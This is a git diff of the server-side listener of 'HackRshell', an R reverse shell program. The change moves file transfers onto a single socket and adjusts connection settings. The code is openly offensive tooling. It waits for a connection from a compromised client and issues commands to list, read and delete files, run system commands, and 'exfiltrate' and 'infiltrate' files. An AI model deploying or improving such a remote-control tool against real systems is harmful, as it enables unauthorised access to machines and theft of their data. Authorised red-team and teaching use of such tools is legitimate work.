@@ -1,19 +1,19 @@
-# HackRshell, an R reverse shell program - server side function.
-# Copyright (C) 2022 Ian Roberts
+    # HackRshell, an R reverse shell program - server side function.
+    # Copyright (C) 2022 Ian Roberts
 
-# This library is free software; you can redistribute it and/or
-# modify it under the terms of the GNU Lesser General Public
-# License as published by the Free Software Foundation; either
-# version 2.1 of the License, or (at your option) any later version.
+    # This library is free software; you can redistribute it and/or
+    # modify it under the terms of the GNU Lesser General Public
+    # License as published by the Free Software Foundation; either
+    # version 2.1 of the License, or (at your option) any later version.
 
-# This library is distributed in the hope that it will be useful,
-# but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
-# Lesser General Public License for more details.
+    # This library is distributed in the hope that it will be useful,
+    # but WITHOUT ANY WARRANTY; without even the implied warranty of
+    # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+    # Lesser General Public License for more details.
 
-# You should have received a copy of the GNU Lesser General Public
-# License along with this library; if not, write to the Free Software
-# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
+    # You should have received a copy of the GNU Lesser General Public
+    # License along with this library; if not, write to the Free Software
+    # Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 
 
 
@@ -23,26 +23,20 @@ safeClose<- function(con) {
   if (!is.null(con)) {close(con)}
 }
 
-
 #"download [filename]"
 #WARNING: this function reads from the main socket
-#WARNING: this function attempts to open a second connection on secondaryPort
-exfiltrateFile <- function(socket, host, secondaryPort, command) {
+exfiltrateFile <- function(socket, host, command) {
   abortDownload <- FALSE
   fileSize <- as.integer(readLines(socket, 1))
   fileName <- substring(command, 10)
-  fileSocket <- NULL
   fileData <- tryCatch({
     if (is.na(fileSize) || fileSize < 0) {
       signalCondition(simpleError("Download Aborted by Client"))
     }
-    fileSocket <- socketConnection(host=host, port=secondaryPort, blocking=TRUE, server=TRUE, timeout=86400, open="rb")
-    readBin(fileSocket, "raw", n=fileSize)
+    readBin(socket, "raw", n=fileSize)
   }, error=function(e){
     abortDownload <<- TRUE
     print(paste("Server error receiving file data: ", e$message))
-  }, finally={
-    safeClose(fileSocket)
   })
   if (!abortDownload) {
     outFile <- NULL
@@ -60,8 +54,7 @@ exfiltrateFile <- function(socket, host, secondaryPort, command) {
 
 #"upload [filename]"
 #WARNING: this function writes to the main socket
-#WARNING: this function attempts to open a second connection on secondaryPort
-infiltrateFile <- function(socket, host, secondaryPort, command) {
+infiltrateFile <- function(socket, host, command) {
   fileName <- substring(command, 8)
   abortUpload <- FALSE
   fileSize <- 0
@@ -89,17 +82,13 @@ infiltrateFile <- function(socket, host, secondaryPort, command) {
   }, finally={
     safeClose(targetFile)
   })
-  uploadSocket <- NULL
   if(!abortUpload) {
     writeLines(toString(fileSize), socket)
     tryCatch({
-      uploadSocket <- socketConnection(host=host, port=secondaryPort, blocking=FALSE, server=TRUE, timeout=300, open="wb")
-      writeBin(fileData, uploadSocket, size=1)
+      writeBin(fileData, socket, size=1)
       print(paste("Sent", fileSize, "bytes!"))
     }, error=function(e){
       print(paste("Error uploading file to client: ", e$message))
-    }, finally={
-      safeClose(uploadSocket)
     })
   } else {
     print("Upload aborted")
@@ -116,13 +105,13 @@ printHelpMessage <- function(validCommands) {
   }
 }
 
-hRs.server <- function(host="localhost", port=4471, secondaryPort=5472) {
+hRs.server <- function(host="localhost", port=4471) {
   validCommands <- c("help", "pwd", "dir", "ls", "cd", "rm", "del",
-                     "cat", "type", "download", "upload", "sys", "exit")
+                      "cat", "type", "download", "upload", "sys", "exit")
   print("HackRshell - the R Reverse Shell", quote=FALSE)
   print("", quote=FALSE)
   print("Waiting for connection...", quote=FALSE)
-  socket <- socketConnection(host=host, port=port, blocking=TRUE, server=TRUE, encoding="utf-8", timeout=300, open="r+")
+  socket <- socketConnection(host=host, port=port, blocking=TRUE, server=TRUE, timeout=86400, open="r+b")
   #Ensures the sockets get closed
   on.exit(tryCatch(close(socket), error=function(e){}, warning=function(w){}))
   fromClient <- readLines(socket, 1)
@@ -145,10 +134,10 @@ hRs.server <- function(host="localhost", port=4471, secondaryPort=5472) {
           exiting <- TRUE
         }
         else if (firstWord == "download") {
-          exfiltrateFile(socket, host, secondaryPort, command)
+          exfiltrateFile(socket, host, command)
         }
         else if (firstWord == "upload") {
-          infiltrateFile(socket, host, secondaryPort, command)
+          infiltrateFile(socket, host, command)
         }
         if (!exiting) {
           fromClient <- readLines(socket, 1)
